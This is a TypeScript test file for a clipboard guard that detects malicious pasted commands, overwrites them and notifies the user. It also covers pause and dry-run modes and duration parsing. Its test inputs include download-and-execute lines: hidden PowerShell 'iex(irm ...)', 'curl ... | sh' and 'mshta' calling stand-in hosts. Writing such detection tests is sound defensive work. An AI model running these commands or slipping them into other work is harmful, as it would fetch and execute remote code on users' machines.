import { test } from "node:test";
import assert from "node:assert/strict";
import { blockedText, handleClipboard, parseDuration } from "../src/guard.ts";

function deps(over: Partial<Parameters<typeof handleClipboard>[1]> = {}) {
  const writes: string[] = [];
  const notes: string[] = [];
  return {
    writes,
    notes,
    d: {
      write: (t: string) => void writes.push(t),
      app: () => "Google Chrome",
      notify: (t: string, b: string) => void notes.push(`${t}: ${b}`),
      paused: () => false,
      dryRun: false,
      ...over,
    },
  };
}

test("malicious clipboard is overwritten before the app lookup, and the user is notified", () => {
  const order: string[] = [];
  const { d, writes, notes } = deps({
    write: (t: string) => void order.push("write:" + t.slice(0, 10)),
    app: () => {
      order.push("app");
      return "Google Chrome";
    },
  });
  const v = handleClipboard("powershell -w hidden -c \"iex(irm http://evil.example/x)\"", d);
  assert.equal(v?.rule, "powershell-hidden");
  assert.equal(order.length, 2);
  assert.match(order[0]!, /^write:/);
  assert.equal(order[1], "app");
  void writes;
  assert.equal(v?.app, "Google Chrome");
  assert.equal(notes.length, 1);
  assert.match(notes[0]!, /Google Chrome/);
});

test("benign clipboard is untouched", () => {
  const { d, writes, notes } = deps();
  assert.equal(handleClipboard("meeting moved to 3pm", d), null);
  assert.equal(writes.length, 0);
  assert.equal(notes.length, 0);
});

test("paused guard lets the paste through", () => {
  const { d, writes } = deps({ paused: () => true });
  assert.equal(handleClipboard("curl https://x.example/i.sh | sh", d), null);
  assert.equal(writes.length, 0);
});

test("dry run notifies but does not touch the clipboard", () => {
  const { d, writes, notes } = deps({ dryRun: true });
  const v = handleClipboard("mshta https://evil.example/a.hta", d);
  assert.equal(v?.rule, "mshta-remote");
  assert.equal(writes.length, 0);
  assert.equal(notes.length, 1);
});

test("blocked text explains itself and how to override", () => {
  const t = blockedText({ rule: "x", why: "because" });
  assert.match(t, /because/);
  assert.match(t, /guard pause/);
});

test("parseDuration", () => {
  assert.equal(parseDuration("90s"), 90_000);
  assert.equal(parseDuration("2m"), 120_000);
  assert.equal(parseDuration("1h"), 3_600_000);
  assert.equal(parseDuration("5"), 300_000);
  assert.throws(() => parseDuration("soon"));
});
